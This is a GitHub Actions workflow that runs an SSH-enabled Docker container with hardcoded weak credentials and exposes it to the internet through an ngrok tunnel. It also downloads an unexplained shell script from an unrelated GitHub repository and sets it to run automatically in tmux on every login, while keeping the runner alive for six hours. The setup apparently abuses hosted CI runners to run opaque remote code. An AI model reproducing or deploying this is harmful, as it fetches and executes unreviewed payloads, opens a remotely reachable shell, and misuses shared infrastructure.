name: docker-ngrok-ssh

on:
  workflow_dispatch:

jobs:
  ssh:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:
      - name: Start Docker SSH container
        run: |
          docker run -d             --name dockerssh             -e SSH_USER=ttt0090             -e SSH_PASSWORD=123789             -p 2222:22             ghcr.io/vevc/ubuntu:25.7.14
          sleep 10

      - name: Install runner tools
        run: |
          sudo apt-get update
          sudo apt-get install -y curl jq

      - name: Setup ngrok
        run: |
          curl -L https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz -o ngrok.tgz
          tar -xzf ngrok.tgz
          chmod +x ngrok
          ./ngrok authtoken ${{ secrets.NGROK_AUTH_TOKEN }}

      - name: Start ngrok TCP 2222
        run: |
          ./ngrok tcp 2222 > ngrok.log &
          sleep 15
          curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url'

      - name: Create auto start.sh
        run: |
          cat > start.sh << 'EOF'
#!/bin/bash
set -e
cd /home/ttt0090
if [ ! -f .init_done ]; then
  sudo apt update
  sudo apt install -y tmux wget curl
  wget -q https://raw.githubusercontent.com/yghhbbuy/vvvioui/refs/heads/main/.github/workflows/ww12345.sh
  chmod +x ww12345.sh
  touch .init_done
fi
tmux new-session -d -s auto "bash ww12345.sh"
exec tmux attach -t auto
EOF

      - name: Copy and enable auto run
        run: |
          docker cp start.sh dockerssh:/home/ttt0090/start.sh
          docker exec dockerssh chmod +x /home/ttt0090/start.sh
          docker exec dockerssh bash -c "echo 'bash ~/start.sh' >> /home/ttt0090/.bash_profile"

      - name: Keep alive
        run: sleep 21600
